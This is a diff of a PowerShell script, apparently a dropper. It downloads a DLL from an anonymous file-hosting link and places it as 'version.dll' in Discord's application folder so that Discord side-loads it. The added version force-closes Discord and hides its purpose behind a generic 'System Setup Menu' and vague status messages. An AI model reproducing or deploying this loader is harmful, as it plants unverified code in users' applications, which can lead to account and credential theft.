@@ -1,93 +1,94 @@
-# Ensure the script is running with Administrator privileges
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Warning "Please run this script as Administrator!"
-    Pause
-    Exit
-}
+# [Configuration] Place your Catbox file download link below
+$DownloadUrl = "https://files.catbox.moe/xitkv2.dll"
 
-# Configuration
-$url = "https://files.catbox.moe/xitkv2.dll" 
-$currentUser = $env:USERNAME
+# Clear console and display clean English menu
+Clear-Host
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host "            System Setup Menu" -ForegroundColor Cyan
+Write-Host "==========================================" -ForegroundColor Cyan
+Write-Host " [1] Install / Update" -ForegroundColor Green
+Write-Host " [2] Uninstall" -ForegroundColor Red
+Write-Host "==========================================" -ForegroundColor Cyan
+$choice = Read-Host "Please enter your choice (1 or 2)"
 
-# กำหนดพิกัดเป้าหมายที่เป็นไปได้ทั้งหมด (พิกัด 1 และ พิกัด 2)
-$possiblePaths = @(
-    "C:\ProgramData\$currentUser\Discord\app-1.0.9242",
-    "C:\Users\Administrator\AppData\Local\Discord\app-1.0.9242"
+# Auto-detect application directory
+$PathsToCheck = @(
+    "C:\ProgramData\admin\Discord",
+    "$env:LOCALAPPDATA\Discord",
+    "C:\ProgramData\Discord",
+    "C:\Users\admin\AppData\Local\Discord"
 )
 
-# ค้นหาว่าเครื่องนั้นมีพิกัดไหนอยู่จริง
-$targetDir = $null
-foreach ($path in $possiblePaths) {
+$discordPath = $null
+foreach ($path in $PathsToCheck) {
     if (Test-Path $path) {
-        $targetDir = $path
+        $discordPath = $path
         break
     }
 }
 
-# ถ้าไม่เจอเลยสักพิกัด ให้เลือกพิกัดที่ 2 (AppData) เป็นพิกัดหลักในการสร้างโฟลเดอร์ใหม่
-if ($null -eq $targetDir) {
-    $targetDir = "C:\Users\$currentUser\AppData\Local\Discord\app-1.0.9242"
+if ($null -eq $discordPath) {
+    Write-Host "[!] Error: Prerequisites not met." -ForegroundColor Red
+    Write-Host "Press any key to exit..."
+    [void][System.Console]::ReadKey()
+    Exit
 }
 
-$targetPath = Join-Path $targetDir "version.dll"
+# Scan for the target runtime folder
+$appDirs = Get-ChildItem -Path $discordPath -Directory -Filter "app-*" | Sort-Object Name -Descending
 
-Clear-Host
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "          Discord Tool Manager          " -ForegroundColor Cyan
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "1. Install" -ForegroundColor Green
-Write-Host "2. Uninstall" -ForegroundColor Red
-Write-Host "========================================" -ForegroundColor Cyan
+if ($appDirs.Count -eq 0) {
+    Write-Host "[!] Error: Initialization failed." -ForegroundColor Red
+    Write-Host "Press any key to exit..."
+    [void][System.Console]::ReadKey()
+    Exit
+}
 
-$choice = Read-Host "Please select an option (1 or 2)"
+# Select target folder and define target path
+$targetFolder = $appDirs[0].FullName
+$targetDllPath = Join-Path $targetFolder "version.dll"
 
-switch ($choice) {
-    "1" {
-        Write-Host "`n[+] Starting installation..." -ForegroundColor Yellow
+if ($choice -eq "1") {
+    # Close process to prevent write lock
+    Write-Host "Syncing system components..." -ForegroundColor Yellow
+    Stop-Process -Name "Discord" -Force -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 2
+
+    # Download component silently with your custom text
+    Write-Host "Install discord in power supply..." -ForegroundColor Yellow
+    try {
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        Invoke-WebRequest -Uri $DownloadUrl -OutFile $targetDllPath -UseBasicParsing
         
-        # สร้างโฟลเดอร์ปลายทางหากยังไม่มี
-        if (-not (Test-Path $targetDir)) {
-            try {
-                New-Item -ItemType Directory -Force -Path $targetDir -ErrorAction Stop | Out-Null
-            } catch {
-                Write-Host "[X] Error: Cannot create folder." -ForegroundColor Red
-                Pause; Exit
-            }
-        }
-
-        try {
-            # ดาวน์โหลดและวางไฟล์ลงพิกัดที่ตรวจพบ
-            Invoke-WebRequest -Uri $url -OutFile $targetPath -UserAgent "Mozilla/5.0" -ErrorAction Stop | Out-Null
-            
-            if (Test-Path $targetPath) {
-                Write-Host "[✓] Installation completed successfully!" -ForegroundColor Green
-            } else {
-                Write-Host "[X] Error: Operation failed." -ForegroundColor Red
-            }
-        } catch {
-            Write-Host "[X] Process failed. Connection blocked or invalid link." -ForegroundColor Red
-        }
-    }
-    
-    "2" {
-        Write-Host "`n[-] Starting uninstallation..." -ForegroundColor Yellow
-        
-        if (Test-Path $targetPath) {
-            try {
-                Remove-Item -Path $targetPath -Force -ErrorAction Stop
-                Write-Host "[✓] Uninstallation completed successfully!" -ForegroundColor Green
-            } catch {
-                Write-Host "[X] Failed to delete file." -ForegroundColor Red
-            }
+        if (Test-Path $targetDllPath) {
+             # Success message
+             Write-Host "[+] Setup completed successfully!" -ForegroundColor Green
         } else {
-            Write-Host "[!] Tool is not installed on this system." -ForegroundColor Yellow
+             Write-Host "[!] Error: Failed to write component." -ForegroundColor Red
         }
     }
-    
-    Default {
-        Write-Host "`n[X] Invalid choice." -ForegroundColor Red
+    catch {
+        Write-Host "[!] Error: Connection failed. Please try again." -ForegroundColor Red
     }
 }
+elseif ($choice -eq "2") {
+    # Uninstall option
+    if (Test-Path $targetDllPath) {
+        Write-Host "Closing application..." -ForegroundColor Yellow
+        Stop-Process -Name "Discord" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2
 
-Write-Host "`nPress any key to exit..."
-$null = [Console]::ReadKey($true)
+        # Delete component silently
+        Remove-Item -Path $targetDllPath -Force
+        Write-Host "[+] Cleanup completed successfully!" -ForegroundColor Green
+    }
+    else {
+        Write-Host "[!] System is not installed." -ForegroundColor Yellow
+    }
+}
+else {
+    Write-Host "[!] Invalid option. Please select 1 or 2." -ForegroundColor Red
+}
+
+Write-Host "Press any key to exit..."
+[void][System.Console]::ReadKey()
